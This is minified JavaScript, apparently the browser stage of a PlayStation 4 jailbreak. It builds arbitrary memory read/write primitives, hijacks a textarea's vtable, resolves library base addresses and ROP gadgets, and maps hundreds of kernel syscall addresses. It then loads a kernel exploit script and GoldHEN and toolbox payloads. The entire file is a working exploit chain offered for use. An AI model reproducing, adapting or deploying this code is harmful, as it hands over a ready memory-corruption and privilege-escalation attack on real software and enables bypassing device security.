var oob_master=new Uint32Array(1024),oob_slave=new Uint8Array(1024),leaker_arr=new Uint32Array(1024),leaker_obj={a:1234};write64(addrof(oob_master).add(16),addrof(oob_slave)),write64(addrof(leaker_arr).add(16),addrof(leaker_obj));var i48_put=function(a,d){d[4]=0|a,d[5]=a/4294967296|0},i48_get=function(a){return a[4]+4294967296*a[5]},addrof=function(a){return leaker_obj.a=a,i48_get(leaker_arr)},fakeobj=function(a){return i48_put(a,leaker_arr),leaker_obj.a},read_mem_setup=function(a,d){i48_put(a,oob_master),oob_master[6]=d},read_mem=function(a,d){read_mem_setup(a,d);for(var e=[],_=0;_<d;_++)e.push(oob_slave[_]);return e},read_mem_s=function(a,d){return read_mem_setup(a,d),""+oob_slave},read_mem_b=function(a,d){read_mem_setup(a,d);d=new Uint8Array(d);return d.set(oob_slave),d},read_mem_as_string=function(a,d){for(var e=read_mem_b(a,d),_="",r=0;r<e.length;r++)_+=String.fromCharCode(e[r]);return _},write_mem=function(a,d){i48_put(a,oob_master),oob_master[6]=d.length;for(var e=0;e<d.length;e++)oob_slave[e]=d[e]},read_ptr_at=function(a){for(var d=0,e=read_mem(a,8),_=7;0<=_;_--)d=256*d+e[_];return d},write_ptr_at=function(a,d){for(var e=[],_=0;_<8;_++)e.push(255&d),d/=256;write_mem(a,e)},hex=function(a){return new Number(a).toString(16)},malloc_nogc=[];function malloc(a){a=new Uint8Array(a);return malloc_nogc.push(a),read_ptr_at(addrof(a)+16)}var tarea=document.createElement("textarea"),real_vt_ptr=read_ptr_at(addrof(tarea)+24),fake_vt_ptr=malloc(1024);write_mem(fake_vt_ptr,read_mem(real_vt_ptr,1024));var real_vtable=read_ptr_at(fake_vt_ptr),fake_vtable=malloc(8192);write_mem(fake_vtable,read_mem(real_vtable,8192)),write_ptr_at(fake_vt_ptr,fake_vtable);var fake_vt_ptr_bak=malloc(1024);write_mem(fake_vt_ptr_bak,read_mem(fake_vt_ptr,1024));var plt_ptr=read_ptr_at(fake_vtable)-10142888;function get_got_addr(a){var a=plt_ptr+16*a,d=read_mem(a,6);if(255!=d[0]||37!=d[1])throw"invalid GOT entry";for(var e=0,_=5;2<=_;_--)e=256*e+d[_];return read_ptr_at(e+=a+6)}var webkit_base=read_ptr_at(fake_vtable)-9437184,libkernel_base=get_got_addr(789),libc_base=get_got_addr(573),saveall_addr=libc_base+141972,loadall_addr=libc_base+159464,pivot_addr=libc_base+159582,infloop_addr=libc_base+234480,jop_frame_addr=libc_base+420272,get_errno_addr_addr=libkernel_base+71696,pthread_create_addr=libkernel_base+94608;function saveall(){var a=malloc(2048);read_ptr_at(fake_vtable+472);write_ptr_at(fake_vtable+472,saveall_addr),write_ptr_at(addrof(tarea)+24,fake_vt_ptr),tarea.scrollLeft=0,write_ptr_at(addrof(tarea)+24,real_vt_ptr),write_mem(a,read_mem(fake_vt_ptr,1024)),write_mem(fake_vt_ptr,read_mem(fake_vt_ptr_bak,1024));read_ptr_at(fake_vtable+472);return write_ptr_at(fake_vtable+472,saveall_addr),write_ptr_at(fake_vt_ptr+56,4660),write_ptr_at(addrof(tarea)+24,fake_vt_ptr),tarea.scrollLeft=0,write_ptr_at(addrof(tarea)+24,real_vt_ptr),write_mem(a+1024,read_mem(fake_vt_ptr,1024)),write_mem(fake_vt_ptr,read_mem(fake_vt_ptr_bak,1024)),a}function pivot(a){var d=malloc(1024);read_ptr_at(fake_vtable+472);write_ptr_at(fake_vtable+472,saveall_addr),write_ptr_at(addrof(tarea)+24,fake_vt_ptr),tarea.scrollLeft=0,write_ptr_at(addrof(tarea)+24,real_vt_ptr),write_mem(d,read_mem(fake_vt_ptr,1024)),write_mem(fake_vt_ptr,read_mem(fake_vt_ptr_bak,1024));read_ptr_at(fake_vtable+472);write_ptr_at(fake_vtable+472,pivot_addr),write_ptr_at(fake_vt_ptr+56,a),write_ptr_at(d+56,read_ptr_at(d+56)-16),write_ptr_at(a,d),write_ptr_at(addrof(tarea)+24,fake_vt_ptr),tarea.scrollLeft=0,write_ptr_at(addrof(tarea)+24,real_vt_ptr),write_mem(fake_vt_ptr,read_mem(fake_vt_ptr_bak,1024))}var sys_345_addr=libkernel_base+157472,sys_346_addr=libkernel_base+157504,sys_544_addr=libkernel_base+157536,sys_416_addr=libkernel_base+157568,sys_522_addr=libkernel_base+157600,sys_676_addr=libkernel_base+157632,sys_672_addr=libkernel_base+157664,sys_654_addr=libkernel_base+157696,sys_125_addr=libkernel_base+157728,sys_397_addr=libkernel_base+157760,sys_340_addr=libkernel_base+157792,sys_97_addr=libkernel_base+157824,sys_192_addr=libkernel_base+157856,sys_554_addr=libkernel_base+157888,sys_611_addr=libkernel_base+157920,sys_406_addr=libkernel_base+157952,sys_135_addr=libkernel_base+157984,sys_639_addr=libkernel_base+158016,sys_627_addr=libkernel_base+158048,sys_649_addr=libkernel_base+158080,sys_89_addr=libkernel_base+158112,sys_7_addr=libkernel_base+158144,sys_675_addr=libkernel_base+158176,sys_95_addr=libkernel_base+158208,sys_117_addr=libkernel_base+158240,sys_442_addr=libkernel_base+158272,sys_655_addr=libkernel_base+158304,sys_480_addr=libkernel_base+158336,sys_404_addr=libkernel_base+158368,sys_56_addr=libkernel_base+158400,sys_543_addr=libkernel_base+158432,sys_656_addr=libkernel_base+158464,sys_324_addr=libkernel_base+158496,sys_310_addr=libkernel_base+158528,sys_15_addr=libkernel_base+158560,sys_612_addr=libkernel_base+158592,sys_601_addr=libkernel_base+158624,sys_331_addr=libkernel_base+158656,sys_327_addr=libkernel_base+158688,sys_315_addr=libkernel_base+158720,sys_586_addr=libkernel_base+158752,sys_635_addr=libkernel_base+158784,sys_668_addr=libkernel_base+158816,sys_433_addr=libkernel_base+158848,sys_673_addr=libkernel_base+158880,sys_78_addr=libkernel_base+158912,sys_607_addr=libkernel_base+158944,sys_476_addr=libkernel_base+158976,sys_105_addr=libkernel_base+159008,sys_585_addr=libkernel_base+159040,sys_98_addr=libkernel_base+159072,sys_636_addr=libkernel_base+159104,sys_195_addr=libkernel_base+159136,sys_535_addr=libkernel_base+159168,sys_31_addr=libkernel_base+159200,sys_623_addr=libkernel_base+159232,sys_34_addr=libkernel_base+159264,sys_407_addr=libkernel_base+159296,sys_593_addr=libkernel_base+159328,sys_539_addr=libkernel_base+159360,sys_330_addr=libkernel_base+159392,sys_588_addr=libkernel_base+159424,sys_140_addr=libkernel_base+159456,sys_190_addr=libkernel_base+159488,sys_137_addr=libkernel_base+159520,sys_594_addr=libkernel_base+159552,sys_444_addr=libkernel_base+159584,sys_403_addr=libkernel_base+159616,sys_660_addr=libkernel_base+159648,sys_401_addr=libkernel_base+159680,sys_126_addr=libkernel_base+159712,sys_54_addr=libkernel_base+159744,sys_232_addr=libkernel_base+159776,sys_610_addr=libkernel_base+159808,sys_626_addr=libkernel_base+159840,sys_341_addr=libkernel_base+159872,sys_99_addr=libkernel_base+159904,sys_138_addr=libkernel_base+159936,sys_663_addr=libkernel_base+159968,sys_189_addr=libkernel_base+16e4,sys_657_addr=libkernel_base+160032,sys_235_addr=libkernel_base+160064,sys_127_addr=libkernel_base+160096,sys_661_addr=libkernel_base+160128,sys_441_addr=libkernel_base+160160,sys_114_addr=libkernel_base+160192,sys_23_addr=libkernel_base+160224,sys_552_addr=libkernel_base+160256,sys_533_addr=libkernel_base+160288,sys_24_addr=libkernel_base+160320,sys_73_addr=libkernel_base+160352,sys_402_addr=libkernel_base+160384,sys_408_addr=libkernel_base+160416,sys_332_addr=libkernel_base+160448,sys_532_addr=libkernel_base+160480,sys_209_addr=libkernel_base+160512,sys_272_addr=libkernel_base+160544,sys_233_addr=libkernel_base+160576,sys_237_addr=libkernel_base+160608,sys_652_addr=libkernel_base+160640,sys_405_addr=libkernel_base+160672,sys_59_addr=libkernel_base+160704,sys_615_addr=libkernel_base+160736,sys_136_addr=libkernel_base+160768,sys_431_addr=libkernel_base+160800,sys_53_addr=libkernel_base+160832,sys_599_addr=libkernel_base+160864,sys_20_addr=libkernel_base+160896,sys_603_addr=libkernel_base+160928,sys_251_addr=libkernel_base+160969,sys_1_addr=libkernel_base+161002,sys_548_addr=libkernel_base+161040,sys_488_addr=libkernel_base+161072,sys_435_addr=libkernel_base+161104,sys_671_addr=libkernel_base+161136,sys_545_addr=libkernel_base+161168,sys_659_addr=libkernel_base+161200,sys_325_addr=libkernel_base+161232,sys_39_addr=libkernel_base+161264,sys_538_addr=libkernel_base+161296,sys_483_addr=libkernel_base+161328,sys_328_addr=libkernel_base+161360,sys_33_addr=libkernel_base+161392,sys_478_addr=libkernel_base+161424,sys_194_addr=libkernel_base+161456,sys_10_addr=libkernel_base+161488,sys_564_addr=libkernel_base+161520,sys_556_addr=libkernel_base+161552,sys_49_addr=libkernel_base+161584,sys_121_addr=libkernel_base+161616,sys_102_addr=libkernel_base+161648,sys_41_addr=libkernel_base+161680,sys_27_addr=libkernel_base+161712,sys_206_addr=libkernel_base+161744,sys_646_addr=libkernel_base+161776,sys_634_addr=libkernel_base+161808,sys_616_addr=libkernel_base+161984,sys_572_addr=libkernel_base+162016,sys_674_addr=libkernel_base+162048,sys_12_addr=libkernel_base+162080,sys_43_addr=libkernel_base+162112,sys_647_addr=libkernel_base+162144,sys_363_addr=libkernel_base+162176,sys_624_addr=libkernel_base+162208,sys_165_addr=libkernel_base+162240,sys_430_addr=libkernel_base+162272,sys_534_addr=libkernel_base+162304,sys_6_addr=libkernel_base+162336,sys_44_addr=libkernel_base+162368,sys_466_addr=libkernel_base+162400,sys_122_addr=libkernel_base+162432,sys_487_addr=libkernel_base+162464,sys_613_addr=libkernel_base+162496,sys_567_addr=libkernel_base+162528,sys_333_addr=libkernel_base+162560,sys_566_addr=libkernel_base+162592,sys_628_addr=libkernel_base+162624,sys_417_addr=libkernel_base+162656,sys_240_addr=libkernel_base+162688,sys_93_addr=libkernel_base+162720,sys_541_addr=libkernel_base+162752,sys_499_addr=libkernel_base+162784,sys_666_addr=libkernel_base+162816,sys_362_addr=libkernel_base+162848,sys_555_addr=libkernel_base+162880,sys_80_addr=libkernel_base+162912,sys_55_addr=libkernel_base+162944,sys_90_addr=libkernel_base+162976,sys_35_addr=libkernel_base+163008,sys_677_addr=libkernel_base+163040,sys_596_addr=libkernel_base+163072,sys_188_addr=libkernel_base+163104,sys_638_addr=libkernel_base+163136,sys_546_addr=libkernel_base+163168,sys_5_addr=libkernel_base+163200,sys_640_addr=libkernel_base+163232,sys_79_addr=libkernel_base+163264,sys_334_addr=libkernel_base+163296,sys_32_addr=libkernel_base+163328,sys_547_addr=libkernel_base+163360,sys_236_addr=libkernel_base+163392,sys_101_addr=libkernel_base+163424,sys_443_addr=libkernel_base+163456,sys_421_addr=libkernel_base+163492,sys_329_addr=libkernel_base+163568,sys_540_addr=libkernel_base+163600,sys_29_addr=libkernel_base+163632,sys_625_addr=libkernel_base+163664,sys_536_addr=libkernel_base+163696,sys_104_addr=libkernel_base+163728,sys_565_addr=libkernel_base+163760,sys_653_addr=libkernel_base+163792,sys_592_addr=libkernel_base+163824,sys_669_addr=libkernel_base+163856,sys_455_addr=libkernel_base+163888,sys_622_addr=libkernel_base+163920,sys_204_addr=libkernel_base+163952,sys_477_addr=libkernel_base+163984,sys_47_addr=libkernel_base+164016,sys_551_addr=libkernel_base+164048,sys_662_addr=libkernel_base+164080,sys_563_addr=libkernel_base+164112,sys_234_addr=libkernel_base+164144,sys_643_addr=libkernel_base+164176,sys_100_addr=libkernel_base+164208,sys_3_addr=libkernel_base+164240,sys_550_addr=libkernel_base+164272,sys_182_addr=libkernel_base+164304,sys_36_addr=libkernel_base+164336,sys_641_addr=libkernel_base+164368,sys_456_addr=libkernel_base+164400,sys_2_addr=libkernel_base+164432,sys_587_addr=libkernel_base+164464,sys_75_addr=libkernel_base+164496,sys_423_addr=libkernel_base+164528,sys_557_addr=libkernel_base+164560,sys_595_addr=libkernel_base+164592,sys_253_addr=libkernel_base+164624,sys_120_addr=libkernel_base+164656,sys_74_addr=libkernel_base+164688,sys_619_addr=libkernel_base+164720,sys_658_addr=libkernel_base+164752,sys_553_addr=libkernel_base+164784,sys_238_addr=libkernel_base+164816,sys_128_addr=libkernel_base+164848,sys_37_addr=libkernel_base+164880,sys_131_addr=libkernel_base+164912,sys_4_addr=libkernel_base+164944,sys_648_addr=libkernel_base+164976,sys_191_addr=libkernel_base+165008,sys_239_addr=libkernel_base+165040,sys_183_addr=libkernel_base+165072,sys_113_addr=libkernel_base+165104,sys_633_addr=libkernel_base+165136,sys_602_addr=libkernel_base+165168,sys_434_addr=libkernel_base+165200,sys_83_addr=libkernel_base+165232,sys_30_addr=libkernel_base+165312,sys_618_addr=libkernel_base+165344,sys_118_addr=libkernel_base+165376,sys_290_addr=libkernel_base+165408,sys_454_addr=libkernel_base+165440,sys_289_addr=libkernel_base+165456,sys_608_addr=libkernel_base+165504,sys_560_addr=libkernel_base+165536,sys_598_addr=libkernel_base+165568,sys_559_addr=libkernel_base+165600,sys_400_addr=libkernel_base+165632,sys_665_addr=libkernel_base+165664,sys_124_addr=libkernel_base+165696,sys_393_addr=libkernel_base+165728,sys_664_addr=libkernel_base+165760,sys_203_addr=libkernel_base+165792,sys_429_addr=libkernel_base+165824,sys_542_addr=libkernel_base+165856,sys_605_addr=libkernel_base+165888,sys_482_addr=libkernel_base+165920,sys_133_addr=libkernel_base+165984,sys_620_addr=libkernel_base+166192,sys_134_addr=libkernel_base+166224,sys_464_addr=libkernel_base+166256,sys_106_addr=libkernel_base+166288,sys_630_addr=libkernel_base+166320,sys_632_addr=libkernel_base+166352,sys_202_addr=libkernel_base+166384,sys_481_addr=libkernel_base+166416,sys_549_addr=libkernel_base+166448,sys_432_addr=libkernel_base+166480,sys_147_addr=libkernel_base+166512,sys_629_addr=libkernel_base+166544,sys_642_addr=libkernel_base+166576,sys_96_addr=libkernel_base+166608,sys_65_addr=libkernel_base+166640,sys_116_addr=libkernel_base+166672,sys_422_addr=libkernel_base+166704,sys_141_addr=libkernel_base+166736,sys_42_addr=libkernel_base+166768,sys_600_addr=libkernel_base+166816,sys_50_addr=libkernel_base+166848,sys_86_addr=libkernel_base+166896,sys_591_addr=libkernel_base+166928,sys_604_addr=libkernel_base+166960,sys_667_addr=libkernel_base+166992,sys_196_addr=libkernel_base+167024,sys_637_addr=libkernel_base+167056,sys_606_addr=libkernel_base+167088,sys_379_addr=libkernel_base+167120,sys_670_addr=libkernel_base+167152,sys_343_addr=libkernel_base+167184,sys_475_addr=libkernel_base+167216,sys_486_addr=libkernel_base+167248,sys_25_addr=libkernel_base+167280,sys_92_addr=libkernel_base+167312,sys_392_addr=libkernel_base+167344,sys_617_addr=libkernel_base+167376,sys_28_addr=libkernel_base+167408,sys_479_addr=libkernel_base+167440,sys_558_addr=libkernel_base+167472,sigtimedwait_addr=sys_345_addr,sigwaitinfo_addr=sys_346_addr,evf_set_addr=sys_544_addr,sigaction_addr=sys_416_addr,pselect_addr=sys_522_addr,cpumode_yield_addr=sys_676_addr,dynlib_get_list_for_libdbg_addr=sys_672_addr,blockpool_map_addr=sys_654_addr,netgetiflist_addr=sys_125_addr,fstatfs_addr=sys_397_addr,sigprocmask_addr=sys_340_addr=libkernel_base+161843,socket_addr=sys_97_addr,fpathconf_addr=sys_192_addr,osem_trywait_addr=sys_554_addr,get_paging_stats_of_all_threads_addr=sys_611_addr,ksem_unlink_addr=sys_406_addr,socketpair_addr=sys_135_addr,localtime_to_utc_addr=sys_639_addr,get_cpu_usage_all_addr=sys_627_addr,dynlib_get_obj_member_addr=sys_649_addr,getdtablesize_addr=sys_89_addr,wait4_addr=sys_7_addr,reserve_2mb_page_addr=sys_675_addr,fsync_addr=sys_95_addr,getrusage_addr=sys_117_addr,thr_suspend_addr=sys_442_addr,blockpool_unmap_addr=sys_655_addr,ftruncate_addr=sys_480_addr,ksem_init_addr=sys_404_addr,revoke_addr=sys_56_addr,evf_trywait_addr=sys_543_addr,dynlib_get_info_for_libdbg_addr=sys_656_addr,mlockall_addr=sys_324_addr,getsid_addr=sys_310_addr,chmod_addr=sys_15_addr,get_proc_type_info_addr=sys_612_addr,mdbg_service_addr=sys_601_addr,sched_yield_addr=sys_331_addr,sched_setparam_addr=sys_327_addr,aio_suspend_addr=sys_315_addr,dmem_container_addr=sys_586_addr,thr_set_ucontext_addr=sys_635_addr,aio_create_addr=sys_668_addr,thr_kill_addr=sys_433_addr,blockpool_move_addr=sys_673_addr,mincore_addr=sys_78_addr,get_self_auth_info_addr=sys_607_addr,pwrite_addr=sys_476_addr,setsockopt_addr=sys_105_addr,is_in_sandbox_addr=sys_585_addr,connect_addr=sys_98_addr,set_timezone_info_addr=sys_636_addr,setrlimit_addr=sys_195_addr,dl_get_list_addr=sys_535_addr,getpeername_addr=sys_31_addr,get_gpo_addr=sys_623_addr,chflags_addr=sys_34_addr,ksem_getvalue_addr=sys_407_addr,dynlib_get_info_addr=sys_593_addr,evf_delete_addr=sys_539_addr,sched_getscheduler_addr=sys_330_addr,mname_addr=sys_588_addr,adjtime_addr=sys_140_addr,lstat_addr=sys_190_addr,rmdir_addr=sys_137_addr,dynlib_load_prx_addr=sys_594_addr,kldunloadf_addr=sys_444_addr,ksem_trywait_addr=sys_403_addr,dynlib_get_info2_addr=sys_660_addr,ksem_post_addr=sys_401_addr,setreuid_addr=sys_126_addr,ioctl_addr=sys_54_addr,clock_gettime_addr=sys_232_addr,budget_get_ptype_addr=sys_610_addr,opmc_get_hw_addr=sys_626_addr,sigsuspend_addr=sys_341_addr,netcontrol_addr=sys_99_addr,utimes_addr=sys_138_addr,aio_multi_wait_addr=sys_663_addr,fstat_addr=sys_189_addr,blockpool_batch_addr=sys_657_addr,ktimer_create_addr=sys_235_addr,setregid_addr=sys_127_addr,aio_submit_addr=sys_661_addr,ksem_timedwait_addr=sys_441_addr,socketclose_addr=sys_114_addr,setuid_addr=sys_23_addr,osem_close_addr=sys_552_addr,jitshm_create_addr=sys_533_addr,getuid_addr=sys_24_addr,munmap_addr=sys_73_addr,ksem_wait_addr=sys_402_addr,ksem_destroy_addr=sys_408_addr,sched_get_priority_max_addr=sys_332_addr,regmgr_call_addr=sys_532_addr,poll_addr=sys_209_addr,getdents_addr=sys_272_addr,clock_settime_addr=sys_233_addr,ktimer_settime_addr=sys_237_addr,process_terminate_addr=sys_652_addr,ksem_open_addr=sys_405_addr,execve_addr=sys_59_addr=libkernel_base+165277,get_resident_fmem_count_addr=sys_615_addr,mkdir_addr=sys_136_addr,thr_exit_addr=sys_431_addr,sigaltstack_addr=sys_53_addr,dynlib_process_needed_and_relocate_addr=sys_599_addr,getpid_addr=sys_20_addr,rdup_addr=sys_603_addr,rfork_addr=sys_251_addr,sys_exit_addr=sys_1_addr=libkernel_base+163536,batch_map_addr=sys_548_addr,cpuset_setaffinity_addr=sys_488_addr,_umtx_unlock_addr=sys_435_addr,get_page_table_stats_addr=sys_671_addr,evf_clear_addr=sys_545_addr,dynlib_get_list2_addr=sys_659_addr,munlockall_addr=sys_325_addr,getppid_addr=sys_39_addr,evf_create_addr=sys_538_addr,shm_unlink_addr=sys_483_addr,sched_getparam_addr=sys_328_addr,access_addr=sys_33_addr,lseek_addr=sys_478_addr,getrlimit_addr=sys_194_addr,unlink_addr=sys_10_addr,opmc_disable_addr=sys_564_addr,osem_cancel_addr=sys_556_addr,getlogin_addr=sys_49_addr,writev_addr=sys_121_addr,netgetsockinfo_addr=sys_102_addr,dup_addr=sys_41_addr,recvmsg_addr=sys_27_addr,futimes_addr=sys_206_addr,get_kernel_mem_statistics_addr=sys_646_addr,thr_get_ucontext_addr=sys_634_addr,sigprocmask_addr=sys_340_addr,thr_get_name_addr=sys_616_addr,virtual_query_addr=sys_572_addr,virtual_query_all_addr=sys_674_addr,chdir_addr=sys_12_addr,getegid_addr=sys_43_addr,get_sdk_compiled_version_addr=sys_647_addr,kevent_addr=sys_363_addr,get_vm_map_timestamp_addr=sys_624_addr,sysarch_addr=sys_165_addr,thr_create_addr=sys_430_addr,jitshm_alias_addr=sys_534_addr,close_addr=sys_6_addr,profil_addr=sys_44_addr,rtprio_thread_addr=sys_466_addr,settimeofday_addr=sys_122_addr,cpuset_getaffinity_addr=sys_487_addr,get_resident_count_addr=sys_613_addr,opmc_get_ctr_addr=sys_567_addr,sched_get_priority_min_addr=sys_333_addr,opmc_set_ctr_addr=sys_566_addr,mmap_dmem_addr=sys_628_addr,sigreturn_addr=sys_417_addr,nanosleep_addr=sys_240_addr,select_addr=sys_93_addr,evf_close_addr=sys_541_addr,openat_addr=sys_499_addr,aio_multi_cancel_addr=sys_666_addr,kqueue_addr=sys_362_addr,osem_post_addr=sys_555_addr,setgroups_addr=sys_80_addr,reboot_addr=sys_55_addr,dup2_addr=sys_90_addr,fchflags_addr=sys_35_addr,get_phys_page_size_addr=sys_677_addr,dynlib_do_copy_relocations_addr=sys_596_addr,stat_addr=sys_188_addr,utc_to_localtime_addr=sys_638_addr,evf_cancel_addr=sys_546_addr,open_addr=sys_5_addr,set_uevt_addr=sys_640_addr,getgroups_addr=sys_79_addr,sched_rr_get_interval_addr=sys_334_addr,getsockname_addr=sys_32_addr,query_memory_protection_addr=sys_547_addr,ktimer_delete_addr=sys_236_addr,netabort_addr=sys_101_addr,thr_wake_addr=sys_443_addr,getcontext_addr=sys_421_addr,sys_exit_addr=sys_1_addr,sched_setscheduler_addr=sys_329_addr,evf_open_addr=sys_540_addr,recvfrom_addr=sys_29_addr,opmc_set_hw_addr=sys_625_addr,dl_get_info_addr=sys_536_addr,bind_addr=sys_104_addr,opmc_set_ctl_addr=sys_565_addr,blockpool_open_addr=sys_653_addr,dynlib_get_list_addr=sys_592_addr,aio_submit_cmd_addr=sys_669_addr,thr_new_addr=sys_455_addr,ipmimgr_call_addr=sys_622_addr,munlock_addr=sys_204_addr,mmap_addr=sys_477_addr,getgid_addr=sys_47_addr,osem_open_addr=sys_551_addr,aio_multi_delete_addr=sys_662_addr,opmc_enable_addr=sys_563_addr,clock_getres_addr=sys_234_addr,set_chicken_switches_addr=sys_643_addr,getpriority_addr=sys_100_addr,read_addr=sys_3_addr,osem_delete_addr=sys_550_addr,setegid_addr=sys_182_addr,sync_addr=sys_36_addr,get_cpu_usage_proc_addr=sys_641_addr,sigqueue_addr=sys_456_addr,fork_addr=sys_2_addr,get_authinfo_addr=sys_587_addr,madvise_addr=sys_75_addr,swapcontext_addr=sys_423_addr,namedobj_create_addr=sys_557_addr,dynlib_unload_prx_addr=sys_595_addr,issetugid_addr=sys_253_addr,readv_addr=sys_120_addr,mprotect_addr=sys_74_addr,test_debug_rwmem_addr=sys_619_addr,fdatasync_addr=sys_658_addr,osem_wait_addr=sys_553_addr,ktimer_gettime_addr=sys_238_addr,rename_addr=sys_128_addr,kill_addr=sys_37_addr,flock_addr=sys_131_addr,write_addr=sys_4_addr,app_state_change_addr=sys_648_addr,pathconf_addr=sys_191_addr,ktimer_getoverrun_addr=sys_239_addr,seteuid_addr=sys_183_addr,socketex_addr=sys_113_addr,thr_resume_ucontext_addr=sys_633_addr,randomized_path_addr=sys_602_addr,_umtx_lock_addr=sys_434_addr,setitimer_addr=sys_83_addr,execve_addr=sys_59_addr,accept_addr=sys_30_addr,get_paging_stats_of_all_objects_addr=sys_618_addr,getsockopt_addr=sys_118_addr,pwritev_addr=sys_290_addr,_umtx_op_addr=sys_454_addr=libkernel_base+165952,preadv_addr=sys_289_addr,dynlib_get_info_ex_addr=sys_608_addr,debug_init_addr=sys_560_addr,dynlib_get_proc_param_addr=sys_598_addr,set_vm_container_addr=sys_559_addr,ksem_close_addr=sys_400_addr,aio_get_data_addr=sys_665_addr,fchmod_addr=sys_124_addr,sendfile_addr=sys_393_addr,aio_multi_poll_addr=sys_664_addr,mlock_addr=sys_203_addr,sigwait_addr=sys_429_addr,evf_wait_addr=sys_542_addr,workaround8849_addr=sys_605_addr,shm_open_addr=sys_482_addr,_umtx_op_addr=sys_454_addr,sendto_addr=sys_133_addr,free_stack_addr=sys_620_addr,shutdown_addr=sys_134_addr,thr_set_name_addr=sys_464_addr,listen_addr=sys_106_addr,physhm_unlink_addr=sys_630_addr,thr_suspend_ucontext_addr=sys_632_addr,__sysctl_addr=sys_202_addr,thr_kill2_addr=sys_481_addr,osem_create_addr=sys_549_addr,thr_self_addr=sys_432_addr,setsid_addr=sys_147_addr,physhm_open_addr=sys_629_addr,get_map_statistics_addr=sys_642_addr,setpriority_addr=sys_96_addr,msync_addr=sys_65_addr,gettimeofday_addr=sys_116_addr,setcontext_addr=sys_422_addr,kqueueex_addr=sys_141_addr,pipe_addr=sys_42_addr,sandbox_path_addr=sys_600_addr,setlogin_addr=sys_50_addr,getitimer_addr=sys_86_addr,dynlib_dlsym_addr=sys_591_addr,dl_get_metadata_addr=sys_604_addr,get_bio_usage_all_addr=sys_667_addr,getdirentries_addr=sys_196_addr,set_phys_fmem_limit_addr=sys_637_addr,is_development_mode_addr=sys_606_addr,mtypeprotect_addr=sys_379_addr,aio_init_addr=sys_670_addr,sigpending_addr=sys_343_addr,pread_addr=sys_475_addr,cpuset_getid_addr=sys_486_addr,geteuid_addr=sys_25_addr,fcntl_addr=sys_92_addr,uuidgen_addr=sys_392_addr,set_gpo_addr=sys_617_addr,sendmsg_addr=sys_28_addr,truncate_addr=sys_479_addr,namedobj_delete_addr=sys_558_addr;function getScript(a,d){var e=document.createElement("script");e.src=a,e.onload=d,e.async=!1,document.body.appendChild(e)}function loadScript2(){getScript("exp_loaderPL.js",function(){})}function load_exploit(){var a,d,e;document.getElementById("ini").innerHTML='<br><br>Exploração do Kernel: <font color="#ee596f">Aguarde...</font>',a="exp_jbKaro.js",d=function(){setTimeout(jailbreak,0)},(e=document.createElement("script")).src=a,e.onload=d,e.async=!1,document.body.appendChild(e)}function load_hen(){ini.innerHTML="<br><br>Goldhen v1.1: <font color=\"#ee596f\">Carregando...</font>",LoadedMSG="<br><br>Goldhen v1.1: <font color=\"#ee596f\"><b>PRONTO!!!</b></font>",PLfile="pl_goldhen_1.1.bin",loadScript2(),setTimeout(function(){ini.innerHTML="<br><br>TollBox: <font color=\"#ee596f\">Carregando...</font>",LoadedMSG="<br><br>TollBox: <font color=\"#ee596f\"><b>PRONTO!!!</b></font>",PLfile="pl_toolbox.bin",loadScript2()},10e3)}